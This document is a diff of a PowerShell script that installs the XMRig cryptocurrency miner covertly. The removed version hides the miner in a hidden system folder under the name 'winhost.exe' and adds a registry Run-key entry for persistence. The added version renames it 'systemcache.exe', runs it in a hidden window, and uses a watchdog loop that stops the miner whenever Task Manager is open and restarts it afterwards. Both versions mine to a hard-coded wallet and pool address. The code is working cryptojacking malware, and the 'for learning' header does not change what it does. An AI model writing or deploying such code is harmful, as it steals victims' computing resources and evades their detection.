@@ -1,113 +1,65 @@
-# Refined PowerShell Miner Configuration Script for Learning
+# ================================
+# StartMining.ps1 - Full Miner Installer and Watchdog
+# ================================
+$AppData = $env:APPDATA
+$MinerDir = "$AppData\XMRigMiner"
+$MinerVersion = "6.21.0"
+$ZipUrl = "https://github.com/xmrig/xmrig/releases/download/v$MinerVersion/xmrig-$MinerVersion-msvc-win64.zip"
+$ZipPath = "$MinerDir\xmrig.zip"
+$ExtractPath = "$MinerDir\extract"
+$ExeName = "systemcache.exe"
+$MinerPath = "$MinerDir\xmrig-$MinerVersion\$ExeName"
+$Wallet = "BTC:1H8fueovMvcQLArhxw7P4QZ3FAfhEZg7CB.worker1"
+$Pool = "159.203.162.18:3333"
+$Password = "x"
+$LogFile = "$MinerDir\miner.log"
 
-# Variables
-$desktop = [Environment]::GetFolderPath("Desktop")
-$hiddenFolder = "$desktop\.WindowsCache"
-$exeName = "winhost.exe" # Renamed miner executable
-$wallet = "BTC:1H8fueovMvcQLArhxw7P4QZ3FAfhEZg7CB.worker1" # Your wallet address
-$pool = "159.203.162.18:3333" # Mining pool
-$password = "x"
-$xmrigUrl = "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-msvc-win64.zip"
-$zipPath = "$hiddenFolder\xmrig.zip"
-$logFile = "$hiddenFolder\miner.log"
-$configPath = "$hiddenFolder\config.json"
-$startupKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-$startupName = "WinCacheHost"
-
-# --- Configuration and Setup ---
-
-# 1. Create hidden folder
-# This block ensures the hidden folder exists and has hidden/system attributes.
-If (!(Test-Path $hiddenFolder)) {
-    Write-Host "Creating hidden folder: $hiddenFolder"
-    New-Item -ItemType Directory -Force -Path $hiddenFolder | Out-Null
-    # Set hidden and system attributes
-    attrib +h +s $hiddenFolder
-} else {
-    Write-Host "Hidden folder already exists: $hiddenFolder"
+# Create miner folder
+if (!(Test-Path $MinerDir)) {
+    New-Item -ItemType Directory -Path $MinerDir | Out-Null
 }
 
-# 2. Download & Extract Miner
-# This section now ensures a fresh download and extraction every time.
-Write-Host "Ensuring fresh miner executable..."
+# Download XMRig
+if (!(Test-Path $MinerPath)) {
+    Invoke-WebRequest -Uri $ZipUrl -OutFile $ZipPath
 
-# Clean up any existing miner files before re-downloading/extracting
-Remove-Item "$hiddenFolder\$exeName", "$zipPath", "$hiddenFolder\tmp" -Recurse -Force -ErrorAction SilentlyContinue
+    Expand-Archive -LiteralPath $ZipPath -DestinationPath $ExtractPath
 
-try {
-    Write-Host "Downloading XMRig from $xmrigUrl to $zipPath"
-    Invoke-WebRequest -Uri $xmrigUrl -OutFile $zipPath -ErrorAction Stop
+    $XmrigOriginal = Get-ChildItem "$ExtractPath\xmrig-$MinerVersion\xmrig.exe" -Force | Select-Object -ExpandProperty FullName
+    $TargetDir = "$MinerDir\xmrig-$MinerVersion"
+    if (Test-Path $TargetDir) { Remove-Item $TargetDir -Recurse -Force }
+    Move-Item "$ExtractPath\xmrig-$MinerVersion" $TargetDir
 
-    Write-Host "Extracting XMRig archive to $hiddenFolder\tmp"
-    Expand-Archive -Path $zipPath -DestinationPath "$hiddenFolder\tmp" -Force -ErrorAction Stop
+    Rename-Item "$TargetDir\xmrig.exe" $ExeName
+    Remove-Item $ZipPath -Force
+    Remove-Item $ExtractPath -Recurse -Force
+}
 
-    # Find the xmrig.exe inside the extracted temporary folder
-    $exe = Get-ChildItem "$hiddenFolder\tmp" -Recurse -Filter "xmrig.exe" | Select-Object -First 1
-    If ($exe) {
-        Write-Host "Copying $($exe.FullName) to $hiddenFolder\$exeName"
-        Copy-Item $exe.FullName "$hiddenFolder\$exeName" -Force
-        # Make the copied executable hidden
-        attrib +h "$hiddenFolder\$exeName"
+# GPU detection
+$gpuArgs = ""
+$gpus = Get-WmiObject Win32_VideoController | Select-Object -ExpandProperty Name
+foreach ($gpu in $gpus) {
+    if ($gpu -like "*nvidia*") { $gpuArgs = "--cuda --cuda-launch=16x1" }
+    elseif ($gpu -like "*amd*" -or $gpu -like "*radeon*") { $gpuArgs = "--opencl --opencl-threads=1 --opencl-launch=64x1" }
+}
+
+# Build arguments
+$arguments = "--algo randomx --url $Pool --user $Wallet --pass $Password --randomx-no-numa --randomx-mode=light --no-huge-pages --threads=1 --cpu-priority=0 --donate-level=1 --no-color --log-file `"$LogFile`" --api-port 0 $gpuArgs"
+
+# Watchdog loop
+while ($true) {
+    $isTaskmgr = Get-Process | Where-Object { $_.Name -eq "Taskmgr" }
+    $isMiner = Get-Process | Where-Object { $_.Name -eq "systemcache" }
+
+    if ($isTaskmgr) {
+        if ($isMiner) {
+            Stop-Process -Name "systemcache" -Force
+        }
     } else {
-        Write-Warning "Could not find xmrig.exe in extracted archive."
+        if (-not $isMiner) {
+            Start-Process -FilePath $MinerPath -ArgumentList $arguments -WindowStyle Hidden
+        }
     }
-}
-catch {
-    Write-Error "Error during download or extraction: $($_.Exception.Message)"
-    # Exit script if critical error occurs during setup
-    exit 1
-}
-finally {
-    # Clean up temporary extraction folder and zip file
-    Write-Host "Cleaning up temporary files..."
-    Remove-Item "$hiddenFolder\tmp", "$zipPath" -Recurse -Force -ErrorAction SilentlyContinue
-}
 
-# 3. Create/Update config.json
-Write-Host "Creating/Updating miner configuration file: $configPath"
-$config = @{
-    api = @{ id = "def" }
-    autosave = $true
-    randomx = @{ "1gb-pages" = $false; "huge-pages" = $false }
-    cpu = @{
-        enabled = $true
-        "max-threads-hint" = 20 # Limit CPU threads to 20
-        priority = 3 # Lower priority to make it less impactful on system responsiveness
-    }
-    # For learning purposes, setting cuda and opencl to false to avoid GPU usage by default
-    # If you intend to use GPUs, you'd need to configure 'devices' within these sections.
-    opencl = @{ enabled = $false }
-    cuda = @{ enabled = $false } # Set to false to disable GPU mining entirely for learning CPU aspects
-
-    pools = @(@{
-        url = "$pool"
-        user = "$wallet"
-        pass = "$password"
-        algo = "rx" # RandomX algorithm for CPU mining
-        tls = $false
-    })
-    "print-time" = 60 # Log statistics every 60 seconds
-    "donate-level" = 1 # XMRig developer donation level
-    "log-file" = $logFile # Path to the log file
-    # Additional settings for stealth (though limited for AV)
-    "syslog" = $false # Disable system logging
-    "background" = $true # Run in background (XMRig specific)
+    Start-Sleep -Seconds 10
 }
-$config | ConvertTo-Json -Depth 10 | Set-Content -Path $configPath -Encoding UTF8
-
-# 4. Start Miner Process
-Write-Host "Starting miner process..."
-# Start the miner hidden, in its working directory
-Start-Process -FilePath "$hiddenFolder\$exeName" -WorkingDirectory $hiddenFolder -WindowStyle Hidden -ArgumentList "--config=$configPath"
-
-# 5. Add to Startup (Persistency)
-Write-Host "Adding script to Windows startup for persistence..."
-try {
-    Set-ItemProperty -Path $startupKey -Name $startupName -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$MyInvocation.MyCommand.Definition`"" -Force
-    Write-Host "Startup entry created successfully."
-}
-catch {
-    Write-Error "Failed to create startup entry: $($_.Exception.Message)"
-}
-
-Write-Host "Script execution completed."
